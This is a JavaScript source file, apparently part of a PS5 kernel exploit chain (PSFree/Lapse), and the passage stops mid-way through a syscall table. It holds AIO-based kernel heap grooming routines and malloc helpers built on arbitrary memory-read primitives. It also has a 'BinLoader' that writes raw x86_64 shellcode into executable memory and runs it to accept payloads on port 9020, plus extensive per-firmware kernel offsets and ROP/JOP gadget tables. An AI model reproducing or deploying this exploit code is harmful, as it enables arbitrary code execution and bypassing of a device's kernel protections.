// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
// int aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
  sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}
// int aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_delete', ids, num_ids, sce_errs);
}
// int aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_poll', ids, num_ids, sce_errs);
}
// int aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}
// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     //SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
  const reqs1 = new Buffer(0x28 * num_reqs);
  for (var i = 0; i < num_reqs; i++) {
    // .fd = -1
    reqs1.write32(0x20 + i * 0x28, -1);
  }
  return reqs1;
}

function spray_aio(loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ) {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (var i = 0, idx = 0; i < loops; i++) {
    aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
    idx += step;
  }
}

function cancel_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    aio_multi_cancel(ids_p.add((bi << 2) * len), len);
  }
  if (rem) {
    aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
  }
}
//================================================================================================
// STAGE SETUP ===================================================================================
//================================================================================================
function setup(block_fd) {
  // this part will block the worker threads from processing entries so that
  // we may cancel them instead. this is to work around the fact that
  // aio_worker_entry2() will fdrop() the file associated with the aio_entry
  // on ps5. we want aio_multi_delete() to call fdrop()
  //log('block AIO');
  const reqs1 = new Buffer(0x28 * num_workers);
  const block_id = new Word();
  for (var i = 0; i < num_workers; i++) {
    reqs1.write32(8 + i * 0x28, 1);
    reqs1.write32(0x20 + i * 0x28, block_fd);
  }
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
  //log('heap grooming');
  // chosen to maximize the number of 0x80 malloc allocs per submission
  const num_reqs = 3;
  const num_grooms = 0x200;
  const groom_ids = new View4(num_grooms);
  const groom_ids_p = groom_ids.addr;
  const greqs = make_reqs1(num_reqs);
  // allocate enough so that we start allocating from a newly created slab
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
  cancel_aios(groom_ids_p, num_grooms);
  //log('Setup complete');
  return [block_id, groom_ids];
}
//================================================================================================
// Malloc ========================================================================================
//================================================================================================
// This function is a C-style 'malloc' (memory allocate) implementation
// for this low-level exploit environment.
// It allocates a raw memory buffer of 'sz' BYTES and returns a
// raw pointer to it, bypassing normal JavaScript memory management.
function malloc(sz) {
  // 1. Allocate a standard JavaScript Uint8Array.
  //    The total size is 'sz' bytes (the requested size) plus a
  //    0x10000 byte offset (which might be for metadata or alignment).
  var backing = new Uint8Array(0x10000 + sz);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is critical to prevent the JS engine from freeing this
  //    memory block. If it were freed, 'ptr' would become a "dangling pointer"
  //    and lead to a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic to "steal" the raw pointer from the JS object.
  //    - mem.addrof(backing): Gets the address of the JS 'backing' object.
  //    - .add(0x10): Moves to the internal offset (16 bytes) where the
  //      pointer to the raw data buffer is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. Attach the original JS 'backing' array itself as a property
  //    to the 'ptr' object.
  //    This is a convenience, bundling the raw pointer ('ptr') with a
  //    "safe" JS-based way ('ptr.backing') to access the same memory.
  ptr.backing = backing;
  // 5. Return the 'ptr' object, which now acts as a raw pointer
  //    to the newly allocated block of 'sz' bytes.
  return ptr;
}
//================================================================================================
// Malloc for 32-bit =============================================================================
//================================================================================================
// This function mimics the C-standard 'malloc' function but for a 32-bit
// aligned buffer. It allocates memory using a standard JS ArrayBuffer
// but returns a *raw pointer* to its internal data buffer.
function malloc32(sz) {
  // 1. Allocate a standard JavaScript byte array.
  //    'sz * 4' suggests 'sz' is the number of 32-bit (4-byte) elements.
  //    The large base size (0x10000) might be to ensure a specific 
  //    allocation type or to hold internal metadata for this "fake malloc".
  var backing = new Uint8Array(0x10000 + sz * 4);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is CRITICAL. It prevents the JS engine from freeing this
  //    memory block. If the 'backing' array was collected, 'ptr' would
  //    become a "dangling pointer" and cause a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic for getting the raw address.
  //    - mem.addrof(backing): Gets the memory address of the JS 'backing' object.
  //    - .add(0x10): Moves to the offset (16 bytes) where the internal
  //      data pointer (pointing to the raw buffer) is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's actual data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. This is a convenience. It attaches a 32-bit view of the *original*
  //    JS buffer (backing.buffer) as a property to the 'ptr' object.
  //    This bundles the raw pointer ('ptr') with a "safe" JS-based way
  //    to access the same memory ('ptr.backing').
  ptr.backing = new Uint32Array(backing.buffer);
  // 5. Return the 'ptr' object. This object now represents a raw
  //    pointer to the newly allocated and GC-protected memory.
  return ptr;
}
//================================================================================================
// Bin Loader ====================================================================================
//================================================================================================
function runBinLoader() {
  // 1. Allocate a large (0x300000 bytes) memory buffer for the *main* payload.
  //    It is marked as Readable, Writable, and Executable (RWX).
  //    This buffer will likely be passed AS AN ARGUMENT to the loader.
  var payload_buffer = chain.sysp('mmap', 0, 0x300000, (PROT_READ | PROT_WRITE | PROT_EXEC), MAP_ANON, -1, 0);
  // 2. Allocate a smaller (0x1000 bytes) buffer for the
  //    *loader shellcode itself* using the custom malloc32 helper.
  var payload_loader = malloc32(0x1000);
  // 3. Get the JS-accessible backing array for the loader buffer.
  var BLDR = payload_loader.backing;
  // 4. --- START OF SHELLCODE ---
  //    This is not JavaScript. This is raw x86_64 machine code, written
  //    as 32-bit integers (hex values), directly into the executable buffer.
  //    This code is the "BinLoader" itself.
  BLDR[0]  = 0x56415741; BLDR[1]  = 0x83485541; BLDR[2]  = 0x894818EC;
  BLDR[3]  = 0xC748243C; BLDR[4]  = 0x10082444; BLDR[5]  = 0x483C2302;
  BLDR[6]  = 0x102444C7; BLDR[7]  = 0x00000000; BLDR[8]  = 0x000002BF;
  BLDR[9]  = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
  BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
  BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
  BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
  BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
  BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
  BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
  BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
  BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
  BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
  BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
  BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
  BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
  BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
  BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
  BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
  BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
  BLDR[60] = 0xC3050FCA;
  // --- END OF SHELLCODE ---
  // 5. Use the 'mprotect' system call to *explicitly* mark the
  //    'payload_loader' buffer as RWX (Readable, Writable, Executable).
  //    This is a "belt and suspenders" call to ensure the OS will
  //    allow the CPU to execute the shellcode we just wrote.
  chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
  // 6. Allocate memory for a pthread (thread) structure.
  var pthread = malloc(0x10);
  // 7. Lock the main payload buffer in memory to prevent it from
  //    being paged out to disk.
  sysi('mlock', payload_buffer, 0x300000);
  //    Create a new native thread.
  call_nze(
    'pthread_create',
    pthread, // Pointer to the thread structure
    0, // Thread attributes (default)
    payload_loader, // The START ROUTINE (entry point). This is the address of our shellcode.
    payload_buffer // The ARGUMENT to pass to the shellcode.
  );
  window.log("BinLoader is ready. Send a payload to port 9020 now", "green");
}
//================================================================================================
// Init LapseGlobal Variables ====================================================================
//================================================================================================
function Init_LapseGlobals() {
  // Verify mem is initialized (should be initialized by make_arw)
  if (mem === null) {
    window.log("ERROR: mem is not initialized. PSFree exploit may have failed.\nPlease refresh page and try again...", "red");
    return 0;
  }
  // Kernel offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_kstr = 0x7f92cb;
      off_cpuid_to_pcpu = 0x212cd10;
      off_sysent_661 = 0x112d250;
      jmp_rsi = 0x6b192;
      //patch_elf_loc = "./kpatch700.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x256b0,
        'pthread_join': 0x27d00,
        'pthread_barrier_init': 0xa170,
        'pthread_barrier_wait': 0x1ee80,
        'pthread_barrier_destroy': 0xe2e0,
        'pthread_exit': 0x19fd0
      }));
      break;
    case 0x750:
      off_kstr = 0x79a92e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x751:
    case 0x755:
      off_kstr = 0x79a96e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_kstr = 0x7edcff;
      off_cpuid_to_pcpu = 0x228e6b0;
      off_sysent_661 = 0x11040c0;
      jmp_rsi = 0xe629c;
      //patch_elf_loc = "./kpatch800.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25610,
        'pthread_join': 0x27c60,
        'pthread_barrier_init': 0xa0e0,
        'pthread_barrier_wait': 0x1ee00,
        'pthread_barrier_destroy': 0xe180,
        'pthread_exit': 0x19eb0
      }));
      break;
    case 0x850:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d50,
        'pthread_barrier_init': 0x283c0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25310
      }));
      break;
    case 0x852:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d60,
        'pthread_barrier_init': 0x283d0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25320
      }));
      break;
    case 0x900:
      off_kstr = 0x7f6f27;
      off_cpuid_to_pcpu = 0x21ef2a0;
      off_sysent_661 = 0x1107f00;
      jmp_rsi = 0x4c7ad;
      //patch_elf_loc = "./kpatch900.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x903:
    case 0x904:
      off_kstr = 0x7f4ce7;
      off_cpuid_to_pcpu = 0x21eb2a0;
      off_sysent_661 = 0x1103f00;
      jmp_rsi = 0x5325b;
      //patch_elf_loc = "./kpatch903.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_kstr = 0x769a88;
      off_cpuid_to_pcpu = 0x21a66c0;
      off_sysent_661 = 0x1100ee0;
      jmp_rsi = 0x15a6d;
      //patch_elf_loc = "./kpatch950.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x1c540,
        'pthread_join': 0x9560,
        'pthread_barrier_init': 0x24200,
        'pthread_barrier_wait': 0x1efb0,
        'pthread_barrier_destroy': 0x19450,
        'pthread_exit': 0x28ca0
      }));
      break;
    default:
      throw "Unsupported firmware";
  }
  // ROP offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_ta_vt = 0x23ba070;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ad0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x50a00;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001fa68, // `58 c3`
        "pop rbx; ret": 0x0000000000028cfa, // `5b c3`
        "pop rcx; ret": 0x0000000000026afb, // `59 c3`
        "pop rdx; ret": 0x0000000000052b23, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c987, // `5e c3`
        "pop rdi; ret": 0x000000000000835d, // `5f c3`
        "pop rsp; ret": 0x0000000000078c62, // `5c c3`
        "pop r8; ret": 0x00000000005f5500, // `41 58 c3`
        "pop r9; ret": 0x00000000005c6a81, // `47 59 c3`
        "pop r10; ret": 0x0000000000061671, // `47 5a c3`
        "pop r11; ret": 0x0000000000d4344f, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da462c, // `41 5c c3`
        "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c986, // `41 5e c3`
        "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
      
        "ret": 0x000000000000003c, // `c3`
        "leave; ret": 0x00000000000f2c93, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
      
        [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001e25cce, // `52 ff 20`
        [jop7]: 0x0000000000078c62, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x277c4, "setcontext": 0x2bc18 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x161f0 }));
      Chain = Chain700_852;
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      off_ta_vt = 0x23ae2b0;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ac0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x4f580;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000003650b, // `58 c3`
        "pop rbx; ret": 0x0000000000015d5c, // `5b c3`
        "pop rcx; ret": 0x000000000002691b, // `59 c3`
        "pop rdx; ret": 0x0000000000061d52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c827, // `5e c3`
        "pop rdi; ret": 0x000000000024d2b0, // `5f c3`
        "pop rsp; ret": 0x000000000005f959, // `5c c3`
        "pop r8; ret": 0x00000000005f99e0, // `41 58 c3`
        "pop r9; ret": 0x000000000070439f, // `47 59 c3`
        "pop r10; ret": 0x0000000000061d51, // `47 5a c3`
        "pop r11; ret": 0x0000000000d492bf, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da945c, // `41 5c c3`
        "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c826, // `41 5e c3`
        "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000025654b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
      
        [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001f1c866, // `52 ff 20`
        [jop7]: 0x000000000005f959, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25f34, "setcontext": 0x2a388 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x16220 }));
      Chain = Chain700_852;
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x12a30;
      off_wk_strlen = 0x918;
      off_strlen = 0x4eb80;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000035a1b, // `58 c3`
        "pop rbx; ret": 0x000000000001537c, // `5b c3`
        "pop rcx; ret": 0x0000000000025ecb, // `59 c3`
        "pop rdx; ret": 0x0000000000060f52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003bd77, // `5e c3`
        "pop rdi; ret": 0x00000000001e3f87, // `5f c3`
        "pop rsp; ret": 0x00000000000bf669, // `5c c3`
        "pop r8; ret": 0x00000000005ee860, // `41 58 c3`
        "pop r9; ret": 0x00000000006f501f, // `47 59 c3`
        "pop r10; ret": 0x0000000000060f51, // `47 5a c3`
        "pop r11; ret": 0x00000000013cad93, // `41 5b c3`
        "pop r12; ret": 0x0000000000d8968d, // `41 5c c3`
        "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
        "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
        "pop r15; ret": 0x00000000002499df, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000291fd7, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
      
        [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001ef0d16, // `52 ff 20`
        [jop7]: 0x00000000000bf669, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x258f4, "setcontext": 0x29c58 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x160c0 }));
      Chain = Chain700_852;
      break;
    case 0x850:
    case 0x852:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x153c0;
      off_wk_strlen = 0x918;
      off_strlen = 0x4ef40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001ac7b, // `58 c3`
        "pop rbx; ret": 0x000000000000c46d, // `5b c3`
        "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
        "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000050878, // `5e c3`
        "pop rdi; ret": 0x0000000000091afa, // `5f c3`
        "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
        "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
        "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
        "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
        "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
        "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
        "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
        "pop r14; ret": 0x0000000000050877, // `41 5e c3`
        "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000001ba53, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
      
        [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x00000000021f3a2e, // `52 ff 20`
        [jop7]: 0x0000000000073c2b, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25904, "setcontext": 0x29c38 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x10750 }));
      Chain = Chain700_852;
      break;
    case 0x900:
    case 0x903:
    case 0x904:
      off_ta_vt = 0x2e73c18;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x1ff60;
      off_wk_strlen = 0x198;
      off_strlen = 0x4fa40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000051a12, // `58 c3`
        "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
        "pop rcx; ret": 0x00000000000657b7, // `59 c3`
        "pop rdx; ret": 0x000000000000986c, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
        "pop rdi; ret": 0x0000000000319690, // `5f c3`
        "pop rsp; ret": 0x000000000004e293, // `5c c3`
        "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
        "pop r9; ret": 0x0000000000422571, // `47 59 c3`
        "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
        "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
        "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
        "pop r13; ret": 0x00000000001da461, // `47 5d c3`
        "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
        "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000008db5b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
      
        [jop1]: 0x00000000004e62a4,
        [jop2]: 0x00000000021fce7e,
        [jop3]: 0x00000000019becb4,
      
        [jop4]: 0x0000000000683800,
        [jop5]: 0x0000000000303906,
        [jop6]: 0x00000000028bd332,
        [jop7]: 0x000000000004e293,
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x24f04, "setcontext": 0x29448 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xcb80 }));
      Chain = Chain900_960;
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_ta_vt = 0x2ebea68;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x28870;
      off_wk_strlen = 0x198;
      off_strlen = 0x4c040;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000011c46, // `58 c3`
        "pop rbx; ret": 0x0000000000013730, // `5b c3`
        "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
        "pop rdx; ret": 0x000000000018de52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
        "pop rdi; ret": 0x000000000005d19d, // `5f c3`
        "pop rsp; ret": 0x00000000000253e0, // `5c c3`
        "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
        "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
        "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
        "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
        "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
        "pop r14; ret": 0x000000000028c900, // `41 5e c3`
        "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000056322, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
      
        [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
        [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
        [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
      
        [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
        [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
        [jop6]: 0x00000000002b7a9c, // `52 ff 20`
        [jop7]: 0x00000000000253e0, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x21284, "setcontext": 0x254dc }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xbb60 }));
      Chain = Chain900_960;
      break;
    default:
      throw "Unsupported firmware";
  }
  syscall_array = [];
  libwebkit_base = null;
  libkernel_base = null;
  libc_base = null;
  gadgets = new Map();
  chain = null;
  nogc = [];
  syscall_map = new Map(Object.entries({
    'read': 3,
    'write': 4,
    'open': 5,
    'close': 6,
    'getpid': 20,
    'setuid': 23,
    'getuid': 24,
    'accept': 30,
    'pipe': 42,
    'ioctl': 54,
    'munmap': 73,
    'mprotect': 74,
    'fcntl': 92,
